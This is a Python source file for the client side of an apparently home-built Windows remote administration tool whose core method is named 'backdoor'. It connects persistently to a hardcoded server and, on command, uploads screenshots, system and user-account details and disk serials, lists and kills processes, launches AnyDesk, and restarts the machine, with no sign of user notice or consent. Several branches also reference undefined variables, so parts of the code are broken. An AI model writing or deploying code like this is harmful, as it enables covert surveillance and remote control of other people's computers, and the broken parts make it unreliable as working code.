from datetime import datetime
from threading import Thread
from PIL import ImageGrab
import subprocess
import threading
import random
import socket
import shutil
import psutil
import time
import sys
import os

# DONE: Modified cmd command function.


class Client:
    def __init__(self, server, main_path):
        self.main_path = main_path
        self.server_host = server[0]
        self.server_port = server[1]
        self.buffer_size = 16184
        self.d = datetime.now()
        self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
        self.current_user = os.getlogin()
        self.hostname = socket.gethostname()
        self.localIP = str(socket.gethostbyname(self.hostname))
        if not os.path.exists(f'{self.main_path}'):
            os.makedirs(self.main_path)

    def connection(self):
        soc = socket.socket()
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        while True:
            time.sleep(1)
            # print(colored(f"[i]Connecting to Server: {self.server_host} | Port {self.server_port}...", 'cyan'))
            try:
                soc.connect((self.server_host, self.server_port))
                self.backdoor(soc)

            except (TimeoutError, WindowsError, ConnectionAbortedError, ConnectionResetError) as e:
                # print(colored(e, 'red'))
                continue

    def anydesk(self):
        self.d = datetime.now().replace(microsecond=0)
        self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
        subprocess.call([r"C:\Program Files (x86)\AnyDesk\anydesk.exe"])

        return

    def run_powershell(self, cmd):
        return subprocess.run(["powershell", "-Command", cmd], capture_output=True)

    def run_cmd(self, cmd):
        self.d = datetime.now()
        self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
        cmd_file = rf"c:\MekifRemoteAdmin\cmd {self.hostname} {str(self.localIP)} {dt}.txt"
        if not os.path.isfile(cmd_file):
            with open(cmd_file, 'w') as file:
                subprocess.run(cmd, capture_output=True, stdout=file)

        else:
            with open(cmd_file, 'a') as file:
                subprocess.run(cmd, capture_output=True, stdout=file)

        return

    def backdoor(self, soc):
        # Send Computer Name to Server
        ident = self.hostname
        soc.send(ident.encode())

        user = self.current_user
        soc.send(user.encode())

        # Wait For Commands
        message = soc.recv(self.buffer_size).decode()
        # print(f"{colored(message, 'green')}")

        while True:
            try:
                command = soc.recv(self.buffer_size).decode()

            except (ConnectionResetError, ConnectionError, ConnectionAbortedError, ConnectionRefusedError):
                break

            try:
                if len(str(command)) == 0:
                    # print(colored("[!]Disconnected!", 'red'))
                    break

                # Vital Signs
                if str(command).lower() == "alive":
                    try:
                        soc.send('yes'.encode())

                    except ConnectionResetError:
                        break

                # Radix
                elif str(command).lower() == "radix":
                    r = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
                    r.wait()
                    msg = r.returncode
                    if msg is None:
                        msg = 'Command Successful.'
                        try:
                            soc.send(f'{msg}'.encode())

                        except ConnectionResetError:
                            break

                    else:
                        msg = "Command Error."
                        try:
                            soc.send(msg.encode())
                            break

                        except ConnectionResetError:
                            break

                # Capture Screenshot
                elif str(command.lower()[:6]) == "screen":
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y"))
                    self.fulldt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    self.filename = \
                        rf"c:\MekifRemoteAdmin\screenshot {self.hostname} {str(self.localIP)} {self.fulldt}.jpg"
                    snap = ImageGrab.grab()
                    snap.save(self.filename)

                    time.sleep(0.2)
                    try:
                        soc.send(f"{self.filename}".encode())
                        msg = soc.recv(1024).decode()

                        # self.send_files(soc)
                        chunk = 40960000
                        sysinfo = open(self.filename, 'rb')
                        # print(msg)
                        data = sysinfo.read(chunk)
                        soc.sendall(data)
                        sysinfo.close()
                        msg = soc.recv(1024).decode()
                        print(f"@Server: {msg}")
                        # soc.send(f"{self.hostname} | {self.localIP}: Screenshot Completed.\n".encode())
                        os.remove(self.filename)
                        os.remove(path)

                    except ConnectionResetError:
                        break

                # Get System Information & Users
                elif str(command.lower()[:2]) == "si":
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    self.sifile = rf"c:\MekifRemoteAdmin\systeminfo {self.hostname} {str(self.localIP)} {self.dt}.txt"

                    # self.boot_time(soc, systeminfofile)
                    sysinfo = open(self.sifile, 'w')
                    sinfo = subprocess.call(['systeminfo'], stdout=sysinfo)
                    sysinfo.write("\n")
                    allusers = subprocess.call(['net', 'user'], stdout=sysinfo)
                    sysinfo.write("\n")
                    hard_drive = subprocess.call(['wmic', 'diskdrive', 'get', 'model,serialNumber,size,mediaType'],
                                                 stdout=sysinfo)
                    sysinfo.close()
                    try:
                        soc.send(f"{self.sifile}".encode())

                    except ConnectionResetError:
                        break

                    time.sleep(2)
                    sysinfo = open(self.sifile, 'r')
                    try:
                        while True:
                            data = sysinfo.read(chunk)
                            soc.sendall(data.encode())

                            if not data:
                                sysinfo.close()
                                break

                        msg = soc.recv(1024).decode()
                        # print(f"@Server: {msg}")
                        soc.send(f"{self.hostname} | {self.localIP}: System Information Sent.\n".encode())
                        os.remove(self.sifile)

                        continue

                    except ConnectionResetError:
                        break

                # Get Last Restart Time
                elif str(command).lower()[:2] == "lr":
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    last_reboot = psutil.boot_time()
                    try:
                        soc.send(f"{self.hostname} | {self.localIP}: "
                                 f"{datetime.fromtimestamp(last_reboot).replace(microsecond=0)}".encode())

                        continue

                    except ConnectionResetError:
                        break

                # Get Current Logged-on User
                elif str(command).lower()[:4] == "user":
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    try:
                        soc.send(f"{self.hostname} | {self.localIP}: Current User: {self.current_user}.\n".encode())
                        continue

                    except ConnectionResetError:
                        break

                # Run Anydesk
                elif str(command.lower()[:7]) == "anydesk":
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    self.anydesk()
                    continue

                # Task List
                elif (str(command.lower())) == "tasks":
                    chunk = 1000000
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    self.taskfile = rf"c:\MekifRemoteAdmin\tasks {self.hostname} {str(self.localIP)} {self.dt}.txt"

                    sysinfo = open(self.taskfile, 'w')
                    sinfo = subprocess.call(['tasklist'], stdout=sysinfo)
                    sysinfo.write("\n")
                    sysinfo.close()
                    soc.send(f"{self.taskfile}".encode())

                    with open(self.taskfile, 'r') as file:
                        for line in file.readlines():
                            task_list.append(line)

                    for t in task_list:
                        print(t)

                    time.sleep(0.5)
                    sysinfo = open(self.taskfile, 'r')

                    while True:
                        data = sysinfo.read(chunk)
                        soc.sendall(data.encode())

                        if not data:
                            sysinfo.close()
                            break

                    msg = soc.recv(1024).decode()
                    soc.send(f"{self.hostname} | {self.localIP}: Task List Sent.\n".encode())
                    os.remove(self.taskfile)

                    # Kill Task
                    try:
                        kill = soc.recv(1024).decode()
                        if str(kill) == "kill":
                            task2kill = soc.recv(1024).decode()
                            os.system(f'taskkill /IM {task2kill} /F')
                            soc.send(f"Task: {task2kill} Killed.".encode())
                            continue

                        else:
                            continue

                    except (ConnectionResetError, ConnectionAbortedError, ConnectionError):
                        break

                # Restart Machine
                elif str(command.lower()[:7]) == "restart":
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    os.system('shutdown /r /t 1')

                # Close Connection
                elif str(command.lower()) == "exit":
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    # print(colored('[!]Connection closed by server.', 'yellow'))
                    soc.shutdown(socket.SHUT_RDWR)
                    soc.close()
                    self.connection()

                continue

            except Exception as err:
                self.connection()

        self.connection()


if __name__ == "__main__":
    task_list = []
    mekif_path = r'c:\MekifRemoteAdmin'
    port = 55400
    servers = [('192.168.1.50', port)]

    # Start Client
    while True:
        for server in servers:
            client = Client(server, mekif_path)
            client.connection()

